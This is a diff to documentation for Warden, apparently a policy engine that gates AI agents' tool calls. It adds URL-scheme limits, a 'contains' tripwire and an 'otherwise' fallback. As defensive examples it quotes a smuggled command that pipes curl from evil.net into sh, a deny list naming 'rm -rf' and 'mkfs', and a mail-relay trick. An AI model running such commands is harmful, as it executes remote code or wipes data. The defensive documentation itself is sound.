@@ -69,7 +69,8 @@ A rule can add `when` conditions. It then matches only if **all** of them hold:
 | `in` | is one of | list of 1–100 text/number values |
 | `startswith`, `endswith` | text starts / ends with | non-empty text |
 | `exists`, `missing` | argument is present / absent | *(no value)* |
-| `host_in` | a URL's real host is one of these (any scheme, port or case; `".x.com"` = x.com and its subdomains) | list of lowercase host names |
+| `host_in` | a URL's real host is one of these (any port or case; `".x.com"` = x.com and its subdomains). Only `http`/`https` URLs unless the condition has `schemes` | list of lowercase host names |
+| `contains` | the text contains this text (or any of a list). **Not allowed in `allow` rules** | non-empty text, or list of 1–100 texts |
 
 - **Warden never gives a looser answer because an argument is missing.** On a `deny` or
   `require_approval` rule a missing argument counts as matching (the rule applies); on an
@@ -79,7 +80,7 @@ A rule can add `when` conditions. It then matches only if **all** of them hold:
   `..` for `startswith`, **denies the whole request**. This stops a `deny` rule being dodged.
 - `true` is never treated as the number `1`.
 - Add `"ignore_case": true` to compare text without caring about upper/lower case
-  (works with `eq`, `neq`, `in`, `startswith`, `endswith`). Use it for email domains:
+  (works with `eq`, `neq`, `in`, `startswith`, `endswith`, `contains`). Use it for email domains:
   `{ "arg": "to", "op": "endswith", "value": "@mycompany.com", "ignore_case": true }`.
 - **Blocking or allowing sites:** use `host_in`, not `startswith`. It compares the URL's
   real host, so `http://`, ports, upper case and trailing dots can't dodge it:
@@ -87,6 +88,26 @@ A rule can add `when` conditions. It then matches only if **all** of them hold:
   names must be written in punycode (`xn--strae-oqa.de`, not `straße.de`), both in the
   policy and in requests; the Unicode form is refused because different software
   converts it differently.
+- **`host_in` and URL schemes.** By default `host_in` only accepts `http://` and
+  `https://` URLs (any case). Any other scheme (`ftp://`, `gopher://`, `file://`,
+  `ws://`, ...) can't be checked by the condition, and **the whole request is denied**,
+  whatever the rule's effect: an allow list of hosts must not let a tool talk FTP or
+  read `file://` URLs, and a deny rule must not be dodged with an odd scheme. If a tool
+  really needs other schemes, list them all on the condition:
+  `{ "arg": "url", "op": "host_in", "value": ["ws.example.com"], "schemes": ["https", "wss"] }`.
+  `schemes` replaces the default (`["https"]` also refuses plain `http`); 1–10 lowercase
+  names; only allowed on `host_in`. Use the same `schemes` on every `host_in` condition
+  for one argument (`warden check` warns, W017): every rule is evaluated, so a URL outside
+  one rule's list denies the request even if another rule would allow it.
+- **Ports in URLs** must be 1–65535 without a leading zero. `:0`, `:99999` or `:0443`
+  (libraries disagree about what they reach) deny the request wherever a rule compares
+  URLs (`host_in` or text ops with a URL value).
+- **`contains`** is a tripwire for `deny` / `require_approval` rules:
+  `{ "arg": "command", "op": "contains", "value": ["rm -rf", "mkfs"] }`. It compares
+  text, not meaning: `rm -fr`, `rm -r -f`, two spaces or `/bin/rm -rf` don't contain
+  `"rm -rf"`. That's why it's refused in `allow` rules (`allow when command contains
+  "git status"` would also allow `git status; curl evil.net | sh`); allow-list exact
+  commands with `eq` / `in` instead. Hidden or look-alike characters deny the request.
 - Text a rule compares may not contain invisible characters or look-alike Unicode
   (full-width letters, look-alike dots), and paths may not contain `%`-escapes; such
   requests are denied.
@@ -95,6 +116,32 @@ A rule can add `when` conditions. It then matches only if **all** of them hold:
   leading, trailing or double dots). Those are routing tricks some mail software still
   follows (`user%evil.net@example.com` can be relayed to evil.net); they're denied.
 - No regex, no code.
+
+### "Otherwise": a stricter answer when the conditions don't hold
+
+A rule can say what happens when its conditions **don't** all hold:
+
+```json
+{ "id": "fetch-our-hosts", "tool": "fetch", "effect": "allow",
+  "when": [ { "arg": "url", "op": "host_in", "value": [".example.com"] } ],
+  "otherwise": "require_approval" }
+```
+
+Fetching from `*.example.com` is allowed; any other host needs a human.
+
+- `otherwise` must be **stricter** than `effect` (`allow` → `require_approval` or `deny`;
+  `require_approval` → `deny`), and `when` must not be empty. Anything else is a load
+  error, so `otherwise` can never loosen an answer.
+- Every condition holds → `effect`. One is false, or its argument is **missing** →
+  `otherwise` (when in doubt, the stricter branch). An argument that **can't be
+  checked** (wrong type, path/URL/email trick, a non-http scheme) still **denies the
+  whole request**.
+- The rule's answer joins all other matching rules as usual: most restrictive wins.
+- The decision names the rule; on the `otherwise` branch the reason is
+  `rule 'fetch-our-hosts': conditions not met` (the rule's `message` is used for the
+  `effect` branch), so the audit log shows which branch decided.
+- There's no general `not`/`or`: one rule is one AND of conditions plus one fallback.
+  Avoid `neq` / `missing` in such a rule (a double negative; `warden check` warns, W016).
 
 ### Nested arguments
 
@@ -142,7 +189,7 @@ rule runs, so an agent can't slip in an argument no rule checks (like `bcc`):
 
 ## Common patterns
 
-One policy with five everyday patterns. It passes `warden check --strict`, and every
+One policy with six everyday patterns. It passes `warden check --strict`, and every
 behaviour described below was checked with `warden test`. Each tool has an argument
 list, so an agent can't add an argument no rule looks at (like `bcc`).
 
@@ -150,8 +197,8 @@ list, so an agent can't add an argument no rule looks at (like `bcc`).
 {
   "tools": {
     "run_command": { "arguments": ["command"], "required": ["command"] },
+    "run_shell": { "arguments": ["command"], "required": ["command"] },
     "send_email": { "arguments": ["to", "subject", "body"], "required": ["to"] },
-    "send_external_email": { "arguments": ["to", "subject", "body"], "required": ["to"] },
     "pay_invoice": { "arguments": ["vendor", "amount"], "required": ["vendor", "amount"] },
     "read_file": { "arguments": ["path"], "required": ["path"] }
   },
@@ -159,10 +206,14 @@ list, so an agent can't add an argument no rule looks at (like `bcc`).
     { "id": "safe-commands", "tool": "run_command", "effect": "allow",
       "when": [ { "arg": "command", "op": "in", "value": ["git status", "git diff", "ls", "pytest"] } ] },
 
+    { "id": "shell-with-approval", "tool": "run_shell", "effect": "require_approval" },
+    { "id": "shell-never-wipe", "tool": "run_shell", "effect": "deny",
+      "when": [ { "arg": "command", "op": "contains", "value": ["rm -rf", "mkfs"] } ],
+      "message": "Never wipe disks or folders" },
+
     { "id": "email-colleagues", "tool": "send_email", "effect": "allow",
-      "when": [ { "arg": "to", "op": "endswith", "value": "@mycompany.com", "ignore_case": true } ] },
-    { "id": "email-outside", "tool": "send_external_email", "effect": "require_approval",
-      "message": "Email outside the company needs a human to approve" },
+      "when": [ { "arg": "to", "op": "endswith", "value": "@mycompany.com", "ignore_case": true } ],
+      "otherwise": "require_approval" },
 
     { "id": "pay-small", "tool": "pay_invoice", "effect": "allow",
       "when": [ { "arg": "amount", "op": "gte", "value": 0 },
@@ -187,12 +238,13 @@ text) are denied. Anything not listed falls through to "no matching rule": deny.
 allows `Ann@MyCompany.com` and denies `bob@gmail.com` and the look-alike
 `ann@mycompany.com.evil.net`. A `bcc` is denied by the argument list.
 
-**External email needs approval** (`email-outside`). Give the agent a second tool,
-`send_external_email`, that always needs a human. Why a second tool: conditions have no
-`not` (there's no "doesn't end with") and rules have no "otherwise", so one tool can't
-say "allow inside the domain, ask for everything else". A `not`/else form is planned.
-Until then, `send_email` to an outsider is simply denied, and the agent uses the other
-tool when it means to write outside.
+**Shell with a tripwire** (`shell-*`). Every command needs a human, and commands
+containing `rm -rf` or `mkfs` are denied outright, so a tired approver can't wave them
+through. `contains` compares text (`rm -fr` slips past it), so it only ever makes the
+answer stricter here; the approval is the real control.
+
+**External email needs approval** (`email-colleagues`, `otherwise`). The same rule
+allows `Ann@MyCompany.com` and sends `bob@gmail.com` (or a missing `to`) to a human.
 
 **Payment thresholds** (`pay-*`). Up to 100: allow. 101 to 5000: approval. Over 5000:
 deny. Note the `gte 0` on the allow rule: without it, `-500` is "less than 100" and
@@ -334,7 +386,7 @@ do what you meant:
 |---|---|
 | W001 | A tool has "deny when..." rules but no argument list, so unexpected arguments aren't checked |
 | W002 | No rules at all: everything is denied |
-| W003 | A rule can never apply, because a stricter unconditional rule always wins |
+| W003 | A rule can never apply, because a stricter unconditional rule (or a stricter rule with `otherwise`) always wins |
 | W004 | A rule duplicates another |
 | W005 | A path prefix without a trailing `/` (`"/data"` also matches `"/database"`) |
 | W006 | A tool has an argument list but no rules: it's always denied |
@@ -347,6 +399,8 @@ do what you meant:
 | W013 | A deny rule checks a nested value (`["headers", "to"]`): other keys in that object aren't checked |
 | W014 | With `--agents FILE`: a rule's `agents` (or `limits.agents`) names an agent that isn't in the file (typo?) |
 | W015 | Two agent names differ only in upper/lower case (`Billing` and `billing` are different agents) |
+| W016 | A rule with `otherwise` uses `neq` or `missing`: a double negative, easy to get backwards |
+| W017 | Two `host_in` conditions on the same argument of a tool accept different `schemes` |
 
 `--agents FILE` checks the agent names that per-agent rules and `limits.agents` use.
 Without it, a policy with per-agent rules gets a note (not a warning) that
